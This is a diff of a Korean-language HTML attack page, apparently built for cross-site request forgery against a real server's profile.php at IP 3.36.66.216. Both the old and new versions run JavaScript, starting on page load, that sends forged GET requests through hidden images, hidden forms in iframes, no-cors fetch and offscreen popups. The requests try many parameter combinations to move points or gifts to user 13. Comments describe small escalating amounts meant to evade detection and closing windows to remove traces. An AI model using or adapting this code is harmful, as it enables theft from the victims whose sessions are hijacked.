@@ -2,197 +2,223 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>⚡ 세션 탈취 성공 후속 공격</title>
+    <title>🔍 응답 분석 도구</title>
     <style>
         body { 
             font-family: Arial; 
-            padding: 20px;
-            background: linear-gradient(45deg, #ff4444, #ffaa00);
-            color: white;
+            padding: 15px;
+            background: #000;
+            color: #0f0;
+            font-size: 14px;
         }
-        .breakthrough {
-            background: rgba(255, 255, 255, 0.1);
-            border: 3px solid #00ff00;
-            padding: 30px;
-            margin: 20px 0;
-            border-radius: 15px;
-            animation: glow 2s infinite alternate;
-        }
-        @keyframes glow {
-            0% { box-shadow: 0 0 20px #00ff00; }
-            100% { box-shadow: 0 0 30px #00ff00, 0 0 40px #00ff00; }
+        .analysis {
+            background: #111;
+            border: 1px solid #0f0;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
         }
         button {
-            background: #ff0000;
-            color: white;
+            background: #0f0;
+            color: #000;
             border: none;
-            padding: 15px 25px;
-            border-radius: 8px;
+            padding: 10px 15px;
+            border-radius: 3px;
             cursor: pointer;
-            margin: 10px;
-            font-size: 16px;
+            margin: 5px;
             font-weight: bold;
         }
-        .success { background: #00aa00; }
+        .critical { background: #ff0000; color: white; }
     </style>
 </head>
 <body>
-    <div class="breakthrough">
-        <h1>⚡ 돌파구 발견!</h1>
-        <h2>🎯 GET 요청 패턴 변화 감지됨</h2>
-        
-        <p><strong>변화사항:</strong></p>
+    <h1>🔍 실시간 응답 분석</h1>
+    
+    <div class="analysis">
+        <h2>📊 현재 상황 분석</h2>
+        <p>✅ GET 공격들이 실행되고 있음</p>
+        <p>⚡ Mixed Content 경고 = 요청 전송 중</p>
+        <p>🎯 이제 **네트워크 탭**에서 응답 코드 확인 필요</p>
+    </div>
+
+    <div class="analysis">
+        <h2>🎯 다음 단계</h2>
+        <button onclick="checkResponses()">📡 응답 코드 체크</button>
+        <button onclick="precisionAttack()">🎯 정밀 공격</button>
+        <button class="critical" onclick="finalBurst()">💥 최종 집중 공격</button>
+    </div>
+
+    <div class="analysis">
+        <h2>🔍 찾아야 할 신호들</h2>
         <ul>
-            <li>✅ 클릭재킹으로 GET 요청 유도 성공</li>
-            <li>✅ Set-Cookie 응답 확인됨</li>
-            <li>⚡ 서버가 다르게 반응하기 시작함</li>
+            <li>🟢 <strong>200 OK</strong> - 성공 신호!</li>
+            <li>🟡 <strong>다른 302 Location</strong> - 새로운 경로</li>
+            <li>🔵 <strong>4xx가 아닌 다른 에러</strong> - 처리되고 있음</li>
+            <li>⚪ <strong>응답 시간 차이</strong> - 서버가 처리 중</li>
         </ul>
-        
-        <button class="success" onclick="exploitGetMethod()">
-            🚀 GET 방식 집중 공격
-        </button>
-        
-        <button onclick="chainedAttack()">
-            ⛓️ 연쇄 공격 실행
-        </button>
-        
-        <button onclick="sessionRiding()">
-            🏄‍♂️ 세션 라이딩 공격
-        </button>
     </div>
 
     <div id="result"></div>
 
     <script>
-        function exploitGetMethod() {
-            showResult('🚀 GET 방식 집중 공격 시작...');
+        function checkResponses() {
+            showResult('📡 응답 패턴 분석 중...');
             
-            // GET 파라미터로 다양한 시도
-            const getAttacks = [
-                // 기본 공격
-                'receiver_id=13&points=100&send_gift=1&gift_type=diamond&message=GET_Attack_1',
-                
-                // 다른 파라미터명 시도
-                'to=13&amount=100&action=send&type=gift&msg=GET_Attack_2',
-                'user_id=13&coins=100&transfer=1&category=premium&note=GET_Attack_3',
-                
-                // 인코딩 우회 시도
-                'receiver%5Fid=13&points=100&send%5Fgift=1&gift%5Ftype=diamond',
-                
-                // 대소문자 변경
-                'Receiver_ID=13&POINTS=100&Send_Gift=1&Gift_Type=diamond',
-                
-                // 추가 파라미터
-                'receiver_id=13&points=100&send_gift=1&gift_type=diamond&submit=1&confirm=yes'
+            // 응답 시간 측정을 위한 정밀 공격
+            const testUrls = [
+                'http://3.36.66.216/profile.php?receiver_id=13&points=1',
+                'http://3.36.66.216/profile.php?to=13&amount=1', 
+                'http://3.36.66.216/profile.php?user_id=13&coins=1',
+                'http://3.36.66.216/profile.php?target=13&value=1'
             ];
             
-            getAttacks.forEach((params, index) => {
+            testUrls.forEach((url, i) => {
                 setTimeout(() => {
-                    const url = `http://3.36.66.216/profile.php?${params}`;
-                    
-                    // Image 태그로 요청 (더 은밀)
+                    const start = Date.now();
                     const img = new Image();
-                    img.src = url + '&_t=' + Date.now();
-                    img.style.display = 'none';
-                    document.body.appendChild(img);
                     
-                    console.log(`🎯 GET Attack ${index + 1}: ${params.substring(0, 50)}...`);
-                }, index * 500);
+                    img.onload = () => {
+                        const time = Date.now() - start;
+                        console.log(`✅ URL ${i+1} 로드 성공! 응답시간: ${time}ms`);
+                    };
+                    
+                    img.onerror = () => {
+                        const time = Date.now() - start;
+                        console.log(`⚠️ URL ${i+1} 에러 (정상), 응답시간: ${time}ms`);
+                    };
+                    
+                    img.src = url + '&t=' + Date.now();
+                    console.log(`🔍 테스트 ${i+1}: ${url.split('?')[1]}`);
+                }, i * 500);
             });
-            
-            showResult(`
-✅ GET 방식 집중 공격 실행됨!
-
-6가지 다른 파라미터 조합으로 시도:
-1. 기본 필드명 조합
-2. 대체 필드명 시도  
-3. 사용자/코인 변형
-4. URL 인코딩 우회
-5. 대소문자 변경
-6. 추가 확인 파라미터
-
-네트워크 탭에서 응답 확인하세요!
-            `);
         }
-
-        function chainedAttack() {
-            showResult('⛓️ 연쇄 공격 실행 중...');
+        
+        function precisionAttack() {
+            showResult('🎯 정밀 타겟팅 공격...');
             
-            // 1단계: 정보 수집
-            setTimeout(() => {
-                const infoUrl = 'http://3.36.66.216/profile.php?action=info&user_id=13';
-                fetch(infoUrl, {mode: 'no-cors'}).catch(() => {});
-                console.log('📊 1단계: 정보 수집');
-            }, 500);
+            // 가장 성공 가능성이 높은 조합들
+            const precisionTargets = [
+                // 1. 표준 필드명
+                'receiver_id=13&points=50&send_gift=1&gift_type=diamond',
+                
+                // 2. 단순화된 필드  
+                'to=13&amount=50&send=1',
+                
+                // 3. 일반적인 전송 형태
+                'user_id=13&transfer=50&action=send',
+                
+                // 4. 포인트 시스템 추정
+                'target_user=13&point_amount=50&operation=transfer',
+                
+                // 5. 선물 시스템 추정
+                'recipient=13&gift_points=50&do_send=true'
+            ];
             
-            // 2단계: 작은 금액부터 시도
-            setTimeout(() => {
-                const smallAttack = 'http://3.36.66.216/profile.php?receiver_id=13&points=1&send_gift=1&gift_type=cake';
-                const img1 = new Image();
-                img1.src = smallAttack;
-                console.log('💰 2단계: 소액 테스트');
-            }, 1000);
-            
-            // 3단계: 점진적 증가
-            const amounts = [5, 10, 25, 50, 75, 100];
-            amounts.forEach((amount, i) => {
+            precisionTargets.forEach((params, i) => {
                 setTimeout(() => {
-                    const url = `http://3.36.66.216/profile.php?receiver_id=13&points=${amount}&send_gift=1&gift_type=coffee&chain=${i+1}`;
+                    // 여러 방법으로 동시 시도
+                    
+                    // 방법 1: Image
                     const img = new Image();
-                    img.src = url;
-                    console.log(`📈 3단계-${i+1}: ${amount}P 시도`);
-                }, 1500 + (i * 300));
-            });
-            
-            showResult('⛓️ 연쇄 공격 진행 중...\n소액부터 점진적으로 증가하여 탐지 회피 시도');
-        }
-
-        function sessionRiding() {
-            showResult('🏄‍♂️ 세션 라이딩 공격...');
-            
-            // 여러 창에서 동시 공격
-            for(let i = 0; i < 5; i++) {
-                setTimeout(() => {
-                    const attackWindow = window.open('', `attack_${i}`, 'width=1,height=1,left=-1000,top=-1000');
+                    img.src = `http://3.36.66.216/profile.php?${params}&method=img`;
                     
-                    if(attackWindow) {
-                        attackWindow.location.href = `http://3.36.66.216/profile.php?receiver_id=13&points=${20 + (i * 10)}&send_gift=1&gift_type=diamond&window=${i}`;
+                    // 방법 2: 숨겨진 Form
+                    const form = document.createElement('form');
+                    form.method = 'GET';
+                    form.action = 'http://3.36.66.216/profile.php';
+                    form.target = `result_${i}`;
+                    form.style.display = 'none';
+                    
+                    params.split('&').forEach(param => {
+                        const [key, value] = param.split('=');
+                        const input = document.createElement('input');
+                        input.name = key;
+                        input.value = value;
+                        form.appendChild(input);
+                    });
+                    
+                    // 추가 메타데이터
+                    const meta = document.createElement('input');
+                    meta.name = 'precision_attack';
+                    meta.value = i + 1;
+                    form.appendChild(meta);
+                    
+                    document.body.appendChild(form);
+                    
+                    // iframe 생성
+                    const iframe = document.createElement('iframe');
+                    iframe.name = `result_${i}`;
+                    iframe.style.display = 'none';
+                    document.body.appendChild(iframe);
+                    
+                    form.submit();
+                    
+                    console.log(`🎯 정밀공격 ${i+1}: ${params}`);
+                }, i * 300);
+            });
+        }
+        
+        function finalBurst() {
+            showResult('💥 최종 집중 공격 개시!');
+            
+            // 모든 가능한 조합으로 폭격
+            const amounts = [1, 5, 10, 25, 50, 75, 100];
+            const fieldSets = [
+                ['receiver_id', 'points', 'send_gift'],
+                ['to', 'amount', 'send'],
+                ['user_id', 'coins', 'transfer'],
+                ['target', 'value', 'action'],
+                ['recipient', 'gift_points', 'do_send']
+            ];
+            
+            let attackCount = 0;
+            
+            fieldSets.forEach((fields, setIndex) => {
+                amounts.forEach((amount, amountIndex) => {
+                    setTimeout(() => {
+                        attackCount++;
                         
-                        // 3초 후 창 닫기
-                        setTimeout(() => {
-                            try { attackWindow.close(); } catch(e) {}
-                        }, 3000);
-                    }
-                    
-                    console.log(`🏄‍♂️ Session Riding ${i + 1}: ${20 + (i * 10)}P`);
-                }, i * 200);
-            }
+                        let url = 'http://3.36.66.216/profile.php?';
+                        url += `${fields[0]}=13`;
+                        url += `&${fields[1]}=${amount}`;
+                        url += `&${fields[2]}=1`;
+                        url += `&burst_attack=${attackCount}`;
+                        url += `&timestamp=${Date.now()}`;
+                        
+                        // 동시에 여러 방법으로
+                        const img = new Image();
+                        img.src = url;
+                        
+                        // fetch도 시도 (CORS 에러 무시)
+                        fetch(url, {mode: 'no-cors'}).catch(() => {});
+                        
+                        console.log(`💥 BURST ${attackCount}: ${fields[0]}=13, ${fields[1]}=${amount}`);
+                        
+                    }, (setIndex * amounts.length + amountIndex) * 100);
+                });
+            });
             
-            showResult(`
-🏄‍♂️ 세션 라이딩 공격 실행!
+            showResult(`💥 최종 집중 공격 진행 중!
+            
+총 ${fieldSets.length * amounts.length}개 조합 공격:
+- 5가지 필드명 세트
+- 7가지 포인트 값  
+- 이미지 + fetch 동시 실행
+- 100ms 간격 연속 공격
 
-전략:
-- 5개 창에서 동시 공격
-- 각기 다른 포인트 (20P, 30P, 40P, 50P, 60P)
-- 빠른 연속 실행으로 서버 혼란 유도
-- 창은 자동으로 닫아서 흔적 제거
-
-목표: 세션 검증 로직의 틈새 공략
-            `);
+네트워크 탭에서 **어떤 요청이 다른 응답**을 받는지 확인하세요!`);
         }
-
+        
         function showResult(text) {
             document.getElementById('result').innerHTML = 
-                '<div class="breakthrough"><pre style="color: #00ff00; font-size: 14px;">' + text + '</pre></div>';
+                '<div class="analysis"><pre style="color: #ff0;">' + text + '</pre></div>';
         }
-
-        // 자동으로 GET 공격 시작
-        setTimeout(() => {
-            exploitGetMethod();
-        }, 2000);
-
-        console.log('⚡ 돌파구 발견! GET 패턴 공격 준비됨');
-        console.log('🎯 서버 반응이 달라지기 시작함');
+        
+        // 자동으로 체크 시작
+        setTimeout(checkResponses, 2000);
+        
+        console.log('🔍 응답 분석 도구 준비됨');
+        console.log('📊 네트워크 탭에서 200 OK 또는 다른 패턴을 찾으세요!');
     </script>
 </body>
 </html>
